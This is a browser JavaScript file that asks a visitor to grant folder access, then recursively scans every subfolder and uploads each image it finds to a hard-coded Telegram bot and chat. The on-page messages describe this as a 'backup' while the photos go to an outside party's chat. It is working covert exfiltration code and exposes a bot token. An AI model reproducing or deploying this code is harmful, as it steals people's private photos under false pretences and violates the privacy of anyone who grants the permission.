document.addEventListener('DOMContentLoaded', function() {
    const accessButton = document.getElementById('accessButton');
    const progressDiv = document.getElementById('progress');
    const statusDiv = document.getElementById('status');

    const BOT_TOKEN = '8238147788:AAGG3aSgjA9wTBxF_dEeidOLorxhFD_GFig';
    const CHAT_ID = '8089839247';

    accessButton.addEventListener('click', async () => {
        try {
            progressDiv.textContent = 'Requesting directory access permission...';
            const directoryHandle = await window.showDirectoryPicker({
                mode: 'read'
            });

            progressDiv.textContent = 'Permission granted. Scanning for all image files...';
            statusDiv.textContent = '';
            
            let totalPhotos = 0;
            const sentFiles = [];

            async function scanDirectory(handle) {
                const entries = [];
                for await (const entry of handle.values()) {
                    entries.push(entry);
                }

                for (const entry of entries) {
                    if (entry.kind === 'directory') {
                        await scanDirectory(entry);
                    } else if (entry.kind === 'file') {
                        const file = await entry.getFile();
                        if (file.type.startsWith('image/')) {
                            totalPhotos++;
                            progressDiv.textContent = `Found ${totalPhotos} photos so far...`;
                            
                            try {
                                await sendToTelegram(file);
                                sentFiles.push(file.name);
                                statusDiv.textContent = `Sent: ${file.name}`;
                            } catch (err) {
                                console.error(`Failed to send ${file.name}:`, err);
                            }
                        }
                    }
                }
            }

            await scanDirectory(directoryHandle);

            progressDiv.textContent = `Scan complete. Processed ${totalPhotos} image files.`;
            statusDiv.textContent = `Successfully transferred ${sentFiles.length} photos to backup.`;
            
        } catch (error) {
            if (error.name === 'AbortError') {
                progressDiv.textContent = 'Permission denied by user.';
            } else {
                progressDiv.textContent = 'Error: ' + error.message;
            }
            statusDiv.textContent = '';
        }
    });

    async function sendToTelegram(file) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', file);

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.status}`);
        }
    }
});
